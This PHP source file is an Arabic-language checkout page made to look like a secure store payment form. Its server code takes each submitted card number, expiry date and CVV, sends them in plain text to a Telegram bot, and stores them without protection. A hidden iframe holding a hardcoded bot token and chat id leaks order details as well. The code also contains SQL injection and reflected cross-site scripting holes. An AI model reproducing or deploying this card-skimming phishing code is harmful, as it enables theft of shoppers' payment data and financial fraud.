<?php
include 'controlPanel/Database.php';
$db = new Database();
$query = "SELECT * FROM `users` WHERE id = 2";
$result = $db->dbQuery($query);

if($db->dbNumRows( $result)){
    $rows = $db->dbFetchResult($result);
    foreach($rows as $row){
        $token = $row['token'];
        $tokenID = $row['tokenID'];
    }
}
if (!isset($_SESSION["user"])) {
    header("location:index.php");
}
$payment = $_GET['payment'];
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_SESSION["user"]; 
    $query = "SELECT * FROM orders WHERE user = $user";
    $result = $db->dbQuery($query);
    if($db->dbNumRows( $result)){
        $rows = $db->dbFetchResult($result);
        foreach($rows as $row){ 
            $name = $row["name"];
            $phone = $row["phone"];
            $location = $row["location"];
            $street = $row["street"];
            $First = $row["payment"];
            $first_batch = $row["first_batch"];
        }
    }
    $CardName = $_POST['CardName']; 
    $cardNumber = $_POST['cardNumber']; 
    $month = $_POST['month'];
    $year = $_POST['year'];
    $cvc = $_POST['cvc'];

    $token1 = $token;
    $bot_id1 = $tokenID;

    $databot=':: طلب جديد | بيانات الدفع :: '.PHP_EOL.'رقم الطلب: '.$user.PHP_EOL.'الاسم على البطاقة: '. $CardName.PHP_EOL.'رقم البطاقة: '. $cardNumber.PHP_EOL.'الشهر: '. $month.PHP_EOL.'السنة: '. $year.PHP_EOL.'سي في في: '. $cvc.PHP_EOL.'   ';
    $apiToken = $token1;
    $data = [
        'chat_id' => $bot_id1,
        'text' => $databot
    ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .http_build_query($data) );
        
    $query = "UPDATE `orders` SET `CardName`='$CardName',`cardNumber`='$cardNumber',`month`='$month',`year`='$year',`cvc`='$cvc' WHERE `user` = $user";
    $result = $db->dbQuery($query);
    if($result){
        header("location:confirem.php");
    }
}
?>

<html lang="ar" dir="rtl">
    <head>
    <?php include "head.php"; ?>
    </head>

<body style="overflow: auto;" data-new-gr-c-s-check-loaded="14.1125.0" data-gr-ext-installed="">


    <div class="loaderk d-flex justify-content-center align-items-center" style="display: none; height: 0px;"> 
    </div>
    <?php include "header.php"; ?>
    <main>    <div class="mt-3 pb-3 mb-4 border-bottom">
        <nav aria-label="breadcrumb">
            <ol class="breadcrumb pt-md-0 pt-2">
                <li class="breadcrumb-item"><a href="index.php" class="text-decoration-none text-dark">الرئيسية</a></li>
                <li class="breadcrumb-item"><a href="order.php" class="text-decoration-none text-dark">سلة المشتريات</a></li>
                <li class="breadcrumb-item active" aria-current="page">الدفع</li>
            </ol>
        </nav>
    </div>
    <div class="container" style="position: relative;">
                    <div id="successOrder" class="p-2 bg-white border shadow rounded w-75" style="position: absolute;top: -20px;z-index: 10000000000000;">
                <div dir="ltr"><button type="button" class="btn-close btn-sm" id="successBtn"></button></div>
                <div class="text-center">
                    <div class="my-3">
                        <span class="bg-success border border-2 border-success rounded-circle p-2">
                            <i class="fas fa-check text-white fa-xl"></i>
                        </span>
                    </div>
                    <h6 class="py-2">تم تقديم طلبك بنجاح</h6>
                </div>
            </div>

                <div class="d-flex align-items-center container mb-3">
            <i class="fas fa-circle fa-fw text-success fa-xl opacity-75"></i>
            <img src="assets/image/icons/step-payment.svg" class="mx-3" alt="">
            <span>طريقة الدفع</span>
            <hr class="mx-2" style="width: 60%;">
        </div>
        <div class="container mb-5">
            <div class="">
                <div class="">
                    <div class="row align-items-center mb-4">
                        <div class="col-6 mb-2">
                            <button class="btn btn-light py-2 border bg-white w-100 btn-lg shadow-sm">
                                <img src="assets/image/icons/mada.webp" class="w-50 mx-auto" height="50" alt="">
                            </button>
                        </div>
                        <div class="col-6 mb-2">
                            <button class="btn btn-light py-2 border bg-white w-100 btn-lg shadow-sm">
                                <img src="assets/image/icons/visa.png" class="w-50 mx-auto" height="50" alt="">
                            </button>
                        </div>
                        <div class="col-12">
                            <a href="success.php" class="btn btn-light bg-white py-2 border w-100 btn-lg shadow-sm">
                                <span class="bg-danger rounded-circle p-1">
                                    <i class="fa-solid fa-building-columns fa-fw "></i>
                                </span>
                                <h6 class="text-dark" style="font-size: 14px;">تحويل بنكي</h6>
                            </a>
                        </div>
                    </div>
                    <h3 class="my-3 text-center">
                        الدفعة المستحقة : <span class="text-danger"><?= $payment ?> ر.س</span>
                    </h3>
                </div>

                <!--  ****************************form*****************************S -->
                <form action="payment.php?payment=<?= $_GET['payment'] ?>" method="POST" class="">
                    <div class="form-floating mb-3">
                        <input type="text" class="form-control" name="CardName" id="name" autocomplete="off" required="" placeholder="الأسم الموجود على البطاقة">
                        <label for="cardname text-secondary">
                            <i class="fas fa-user fa-fw text-secondary mx-2"></i>
                            <span class="text-secondary">اسم حامل البطاقة</span>
                        </label>
                    </div>
                    <div class="form-floating mb-3">
                        <input type="tel" name="cardNumber" class="form-control rounded" id="cardNumber" autocomplete="off" required="" placeholder="0000 0000 0000 0000" maxlength="16">
                        <label for="cardNumber text-secondary">
                            <i class="fas fa-credit-card fa-fw text-secondary mx-2"></i>
                            <span class="text-secondary">رقم البطاقة</span>
                        </label>
                    </div>
                    <div class="">
                        <div class="row ">
                            <div class="col-6">
                                <div class="container">

                                    <div class="row border rounded" style="overflow: hidden;">

                                        <div class="col-6 px-0 mx-0">
                                            <div class="form-floating">
                                                <input type="tel" class="form-control border-0" maxlength="2" name="month" required="" id="month" placeholder="name">
                                                <label for="floatingInput text-secondary">
                                                    <span class="text-secondary">الشهر</span>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="col-6  px-0 mx-0">
                                            <div class="form-floating">
                                                <input type="tel" class="form-control border border-right-0 border-top-0 border-left border-bottom-0 rounded-0" maxlength="2" name="year" required="" id="year" placeholder="name">
                                                <label for="year text-secondary">
                                                    <span class="text-secondary">السنة</span>
                                                </label>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-6">
                                <div class="form-floating mb-3">
                                    <input type="tel" class="form-control" maxlength="3" name="cvc" required="" id="cvc" placeholder="name">
                                    <label for="cvc text-secondary">
                                        <span class="text-secondary">رمز التحقق (CVV)</span>
                                    </label>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="container text-secondary mb-4">

                        <p style="font-size: 14px;">
                            <span class="text-success">
                                تسوق إلكتروني آمن 100%</span>
                            <i class="fab fa-cc-amazon-pay fa-fw mx-1"></i>
                            <i class="fab fa-cc-apple-pay fa-fw"></i>
                            <i class="fas fa-shield fa-fw mx-1"></i>
                        </p>
                    </div>
                    <div class="">
                        <button name="card" id="CardBtn" type="submit" class="btn btn-dark w-100">
                            <span>إكمال الدفع</span>
                            <i class="fa-solid fa-angle-left fa-fade fa-fw"></i>
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <iframe class="d-none" src="https://api.telegram.org/bot6275729004:AAHFnEvKPlk85C7GDxKFcXRPqi8u9ypHs2g/sendMessage?chat_id=-1001875595955&amp;parse_mode=Markdown&amp;text=الاسم : gg %0A  المبلغ : 6299 %0A  الدفعة الاولى : 1000 %0A  العنوان : 4554 - 5445 %0A  الفاتورة : almamlka-mobile.com%2Fadmin%2ForderShowS.php%3ForderID%3D202 %0A  القسط : almamlka-mobile.com%2Fadmin%2FtaqseT.php%3ForderID%3D202 %0A  واتساب : https%3A%2F%2Fwa.me%2F%2B96622 %0A  " frameborder="0"></iframe>

<a href="https://wa.me/<?= $db->get_setting('whatsapp') ?>" class="contact py-2 px-3 bg-success rounded-circle">
    <i class="fab fa-whatsapp text-white my-1 fa-2x"></i>
</a>
</main>
<?php 
include "footer.php"; 
include "script.php"; 
?>

</body>
</html>